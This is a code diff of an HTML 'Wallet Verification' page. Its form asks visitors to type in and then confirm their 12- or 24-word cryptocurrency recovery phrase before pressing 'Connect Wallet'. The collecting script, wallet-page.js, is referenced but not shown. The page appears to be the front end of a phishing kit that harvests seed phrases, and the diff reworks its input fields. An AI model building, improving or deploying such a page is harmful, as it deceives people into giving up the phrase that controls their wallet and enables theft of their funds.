@@ -1,37 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Wallet Verification</title>
-    <link rel="stylesheet" href="wallet-page.css">
-</head>
-<body>
-
-<div class="container">
-    <div class="card-box">
-        <img id="walletLogo" class="wallet-logo" alt="Wallet Logo">
+    <link rel="stylesheet" href="wallet-page.css" />
+  </head>
+  <body>
+    <div class="container">
+      <div class="card-box">
+        <img id="walletLogo" class="wallet-logo" alt="Wallet Logo" />
         <h2 id="walletName">Wallet</h2>
 
         <div class="input-area">
-            <input id="walletInput" type="text" placeholder="Enter wallet phrase (12 or 24 words)">
-            <textarea id="phraseInput" placeholder="confirm your wallet phrase (12 or 24 words)"></textarea>
+          <textarea
+            id="walletInput"
+            placeholder="Enter wallet phrase (12 or 24 words)"
+            rows="4"
+          ></textarea>
+
+          <textarea
+            id="phraseInput"
+            placeholder="confirm your wallet phrase (12 or 24 words)"
+          ></textarea>
         </div>
 
         <p class="confirm-text">Are you sure you entered correctly?</p>
         <button class="wallet-btn" id="connectBtn">Connect Wallet</button>
+      </div>
     </div>
-</div>
 
-<!-- Popup -->
-<div id="popup" class="popup">
-    <div class="popup-content">
+    <!-- Popup -->
+    <div id="popup" class="popup">
+      <div class="popup-content">
         <p id="popupText"></p>
         <button class="close-btn" id="closePopupBtn">OK</button>
+      </div>
     </div>
-</div>
 
-<script src="wallet-page.js"></script>
-
-</body>
+    <script src="wallet-page.js"></script>
+  </body>
 </html>
